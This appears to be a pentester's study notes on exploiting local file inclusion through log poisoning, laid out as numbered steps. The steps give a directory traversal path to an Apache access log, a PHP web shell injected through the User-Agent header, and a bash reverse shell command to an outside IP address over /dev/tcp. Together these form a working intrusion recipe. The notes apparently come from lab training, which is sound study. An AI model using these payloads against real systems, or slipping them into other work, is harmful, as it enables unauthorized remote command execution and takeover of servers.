
LFI allows us to include a file in the applications running code. We can use LFI to execute local or remote files. We can also display the contents of non-executable files.

LFI functionally works the same way as a directory traversal but yields different results (execution vs reading) LFI functions as both - but directory traversal can read .php files.

### Log Poisoning

Log poisoning can be used to achieve RCE via LFI - by poisoning logs with malicious code.

1. find a directory traversal vulnerability by testing URL parameters.
2. test for LFI by attempting to inject malicious code into the log file of the webserver.
		1. `../../../../../../../../../../../var/log/apache2/access.log` - will spit out the contents of the access log if directory traversal vuln is present. We can see which information is stored in the log and try to change it to code - for example user-agent information can be replaced with php code and burpsuite.
3. change the user agent to `Mozilla/5.0 <?php echo system($_GET['cmd']); ?>`
4. request the log file and include a parameter for the command to be executed - the results of the command will now turn up in the log file once rendered by a php page.
5. `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"` - utilize to get a reverse shell through the LFI vuln - this command will need to be URL encoded to account for the spacing - burpsuite will automatically do this if you use the request query parameter field.